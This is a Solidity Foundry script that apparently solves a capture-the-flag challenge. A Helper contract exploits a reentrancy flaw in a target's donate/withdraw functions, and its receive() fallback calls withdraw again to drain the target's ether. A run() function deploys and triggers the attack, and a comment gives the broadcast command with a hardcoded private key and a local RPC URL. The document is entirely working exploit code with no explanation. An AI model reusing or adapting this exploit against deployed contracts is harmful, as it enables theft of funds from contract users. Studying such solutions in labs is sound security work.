// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
    function balanceOf(address _who) external view returns (uint256);
}

contract Helper {
    bool public flag = false;
    address public target_;
    uint256 public amount_;

    function trigger(address target) public payable {
        target_ = target;
        amount_ = msg.value;
        ITarget(target).donate{value: msg.value}(address(this));
        flag = true;
        ITarget(target).withdraw(msg.value);
        flag = false;
    }

    receive() external payable {
        if (!flag) return;
        ITarget(target_).withdraw(amount_);
    }
}

contract SolveScript is Script {
    address public target = 0x788F1E4a99fa704Edb43fAE71946cFFDDcC16ccB;

    function setUp() public {}

    // forge script -vvv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();
        console.log("target contract balance : %d", target.balance);
        Helper helper = new Helper();
        helper.trigger{value:1000000000000000}(target);
        console.log("target contract balance after poc : %d", target.balance);
        vm.stopBroadcast();
    }
}
